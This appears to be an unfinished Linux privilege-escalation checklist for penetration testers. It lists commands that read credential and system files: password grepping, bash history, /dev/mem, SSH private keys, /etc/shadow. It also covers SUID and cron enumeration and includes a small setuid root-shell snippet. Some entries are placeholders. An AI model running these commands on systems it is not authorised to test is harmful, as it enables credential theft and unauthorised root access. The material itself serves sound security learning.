# Privilege Escalation Methodology👽
## ON-GO
"**Slow is smooth, and smooth is fast**"
Be methodical in what you do.
So you're inside the system and you wanna pop that damn root shell? Calm down as you have to go deeper into the target.

We think that the mind map provived by Conda (please, go support him on his YouTube channel) is very useful and straightforward. So, we've decided to translate it into this checklist.
You can find the mindmap created with Obsidian by us here ![[linux_privesc_mindmap.png]] and the Conda's original one (That is better in term of design) here. Go check his playlist on YouTube!, you can find the link under the PrivEsc section inside README.MD ([[README#PrivEsc]])

## Linux
### Credential Access
- [ ] Try known passwords
- [ ] Search creds from config files (Try different word other the PASSWORD, e.g: pass, passwd, pwd, user, usr, username, secret, cred, credential, auth):
> grep \--color\=auto \-rnw '/' \-ie "PASSWORD" \--color\=always 2> /dev/null
> find . \-type f \-exec grep \-i \-I "PASSWORD" {} /dev/null
> locate password | more
- [ ] Search creds from local DBs:
- [ ] Search creds from bash history:
> history
> cat ~/.bash_history
- [ ] Search creds from memory:
> strings /dev/mem \-n10 | grep \-i PASS
- [ ] SSH keys:
> cat ~/.ssh/id_rsa
> ls ~/.ssh/\*
> find / -name authorized_keys 2> /dev/null
> find / -name id_rsa 2> /dev/null
- [ ] Sudo privileges:
> sudo -l
- [ ] Group privileges:
> id
> groups

### Exploit
- [ ] Services running on localhost are vulnerable?
> ps aux
> ps aux | grep root
- [ ] Kernel version, vulnerable?
> uname -a
> (cat /proc/version || uname -a ) 2>/dev/null
> lsb_release -a 2>/dev/null
- [ ] Binary file versions, vulnerable?
> ff

### Misconfiguration
- [ ] Cron job -> check for write permissions on the following files:
> /etc/init.d
> /etc/cron\*
> /etc/crontab
> /etc/cron.allow
> /etc/cron.d 
> /etc/cron.deny
> /etc/cron.daily
> /etc/cron.hourly
> /etc/cron.monthly
> /etc/cron.weekly
> /etc/sudoers
> /etc/exports
> /etc/anacrontab
> /var/spool/cron
> /var/spool/cron/crontabs/root
> crontab \-l
> ls \-alh /var/spool/cron;
> ls \-al /etc/ | grep cron
> ls \-al /etc/cron\*
> cat /etc/cron\*
> cat /etc/at.allow
> cat /etc/at.deny
> cat /etc/cron.allow
> cat /etc/cron.deny\*
- [ ] Writeable cron job dependecy (File, Python library, etc)
- [ ] Find SUID:
> find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \\;
> find / -uid 0 -perm -4000 -type f 2>/dev/null
- [ ] Create SUID:
>
- [ ] SGID:
```bash
print 'int main(void){\\nsetresuid(0, 0, 0);\\nsystem("/bin/sh");\\n}' \> /tmp/suid.c   
gcc -o /tmp/suid /tmp/suid.c  
sudo chmod +x /tmp/suid # execute right
sudo chmod +s /tmp/suid # setuid bit
```
- [ ] Interesting capabilities on binary:
> ff
- [ ] Any accessible sensitive file?
	- [ ] /etc/passwd
	- [ ] /etc/shadow
	- [ ] /etc/sudoers
	- [ ] Configuration files
	- [ ] /root/.ssh/id_rsa
	- [ ] entire root folder
	- [ ] Check env info
	 > (env || set) 2>/dev/null
	 > echo $PATH
- [ ] Writeable PATH
	- [ ] Root $PATH writeable
	- [ ] Directory in PATH writeable
- [ ] LD_PRELOAD set in /etc/sudoers

## Windows
### System Enumeration
- [ ] uname -a
- [ ] ca
### User Enumeration
### Network Enumeration
### Password Hunting


